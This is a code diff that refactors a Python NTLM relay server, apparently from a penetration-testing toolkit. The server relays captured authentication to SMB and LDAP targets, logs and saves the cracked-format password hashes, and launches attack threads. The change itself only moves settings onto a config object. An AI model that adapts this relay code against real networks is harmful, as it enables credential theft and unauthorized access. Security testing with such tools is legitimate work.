@@ -38,9 +38,6 @@ class HTTPRelayServer(Thread):
             #This is because old config passed all variables manually 
             #and the code still depends on that (TODO: Fix this)
             self.target = self.config.target
-            self.exeFile = self.config.exeFile
-            self.command = self.config.command
-            self.mode = self.config.mode
             self.outputFile = self.config.outputFile
             self.redirecthost = self.config.redirecthost
 
@@ -57,7 +54,7 @@ class HTTPRelayServer(Thread):
             self.machineHashes = None
             self.domainIp = None
             self.authUser = None
-            if self.server.mode != 'REDIRECT':
+            if self.server.config.mode != 'REDIRECT':
                 if self.server.target is not None:
                     self.target = self.server.target.get_target(client_address[0],self.server.config.randomtargets)
                     logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.target[1]))
@@ -108,7 +105,7 @@ class HTTPRelayServer(Thread):
 
         def do_GET(self):
             messageType = 0
-            if self.server.mode == 'REDIRECT':
+            if self.server.config.mode == 'REDIRECT':
                 self.do_SMBREDIRECT()
                 return
 
@@ -148,8 +145,8 @@ class HTTPRelayServer(Thread):
                     logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target[1],authenticateMessage['domain_name'], authenticateMessage['user_name']))
                     ntlm_hash_data = outputToJohnFormat( self.challengeMessage['challenge'], authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'] )
                     logging.info(ntlm_hash_data['hash_string'])
-                    if self.server.outputFile is not None:
-                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.outputFile)
+                    if self.server.config.outputFile is not None:
+                        writeJohnOutputToFile(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'], self.server.config.outputFile)
                     self.server.target.log_target(self.client_address[0],self.target)
                     self.do_attack()
                     # And answer 404 not found
@@ -164,7 +161,7 @@ class HTTPRelayServer(Thread):
             if self.target[0] == 'SMB':
                 try:
                     self.client = SMBRelayClient(self.target[1], extended_security = True)
-                    self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
+                    self.client.setDomainAccount(self.server.config.machineAccount, self.server.config.machineHashes, self.server.config.domainIp)
                     self.client.set_timeout(10)
                     negotiate = ntlm.NTLMAuthNegotiate()
                     negotiate.fromString(token)
@@ -274,7 +271,7 @@ class HTTPRelayServer(Thread):
 
         def do_attack(self):
             if self.target[0] == 'SMB':
-                clientThread = self.server.config.attacks['SMB'](self.server.config,self.client,self.server.exeFile,self.server.command)
+                clientThread = self.server.config.attacks['SMB'](self.server.config, self.client, self.authUser)
                 clientThread.start()
             if self.target[0] == 'LDAP' or self.target[0] == 'LDAPS':
                 clientThread = self.server.config.attacks['LDAP'](self.server.config, self.client, self.authUser)
